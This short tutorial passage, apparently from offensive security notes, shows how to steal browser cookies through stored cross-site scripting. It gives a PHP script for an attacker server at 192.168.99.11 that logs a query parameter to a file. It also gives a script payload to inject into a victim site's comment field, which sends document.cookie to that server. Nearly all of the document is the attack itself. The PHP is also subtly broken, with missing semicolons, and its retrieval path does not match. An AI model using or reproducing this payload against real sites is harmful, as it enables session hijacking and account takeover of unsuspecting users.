### Steal Cookies with Persistent XSS

Suppose on `192.168.99.11` we set up a webserver with the following PHP script: 
```php
<?php
$filename="/tmp/cookie.txt";
$file=fopen($filename, 'a');
$cookie=$_GET['c']    // get the value of 'c' parameter from the URI
fwrite($file,$cookie)
fclose($file)
?>
```

On victim's website, find an injection point vulnerable to stored XSS (i.e. comment field), and inject the following:
```html
<script> 
var i = new Image(); 
i.src="http://192.168.99.11/get.php?c="+document.cookie;
</script> 
```

Then go to `192.168.99.11/tmp/cookie.txt` to see logged cookie.
